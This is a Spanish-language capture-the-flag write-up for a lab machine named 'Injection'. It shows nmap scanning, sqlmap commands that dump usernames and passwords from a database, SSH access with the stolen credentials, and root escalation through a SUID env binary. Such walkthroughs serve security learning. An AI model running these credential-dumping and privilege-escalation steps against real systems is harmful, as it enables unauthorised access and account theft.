# MÁQUINA INJECTION

Lo primero que habrá que hacer será realizar un escaneo de puertos usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Injection/foto.jpg)

Vemos que tenemos abiertos los puertos 80 y 22, por lo que vamos a ver el contenido de la página web:

![WEB](https://github.com/Isma-yo/photos/blob/main/Injection/foto2.jpg)

Nos encontramos con un panel de login, llamandose la máquina Injection, podemos probar si es vulnerable a un SQL Injection:

![INJ](https://github.com/Isma-yo/photos/blob/main/Injection/foto3.jpg)

Vemos que si que era vulnerable y obtenemos un usuario y contraseña que usaremos para conectarnos por SSH:

![CRE](https://github.com/Isma-yo/photos/blob/main/Injection/foto4.jpg)

# MANERA ALTERNATIVA

La otra forma de obtener las credenciales es usando el comando sqlmap:

```shell
sqlmap -u http://172.17.0.2 --dbs --batch --forms
```

![CRE](https://github.com/Isma-yo/photos/blob/main/Injection/foto5.jpg)

```shell
sqlmap -u http://172.17.0.2 --dbs --batch --forms
```

```shell
sqlmap -u http://172.17.0.2 -D register --tables --batch --forms
```

![DB](https://github.com/Isma-yo/photos/blob/main/Injection/foto6.jpg)

```shell
sqlmap -u http://172.17.0.2 -D register -T users --columns  --batch --forms
```

![TA](https://github.com/Isma-yo/photos/blob/main/Injection/foto7.jpg)

```shell
sqlmap -u http://172.17.0.2 -D register -T users -C username,passwd --dump --batch --forms
```

![PASSWD](https://github.com/Isma-yo/photos/blob/main/Injection/foto8.jpg)

Ahora accederemos por SSH usando esas credenciales:

![SSH](https://github.com/Isma-yo/photos/blob/main/Injection/foto9.jpg)

Si hacemos un sudo -l veremos que no podemos ejecutarlo ya que no esta instalado sudo. Lo que deberemos de hacer será ejeuctar el comando find / -perm -4000 2>/dev/null para ver que comandos tienen permisos especiales:

![FIND](https://github.com/Isma-yo/photos/blob/main/Injection/foto10.jpg)

El comando env está presente por lo que vamos a ver si podemos utilizarlo para escalar privilegios. Para ello iremos a la página de GTFOBins y buscaremos el env:

https://gtfobins.github.io/gtfobins/env/#suid

```shell
/usr/bin/env /bin/bash -p
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/Injection/foto11.jpg)

Y ya somos root!


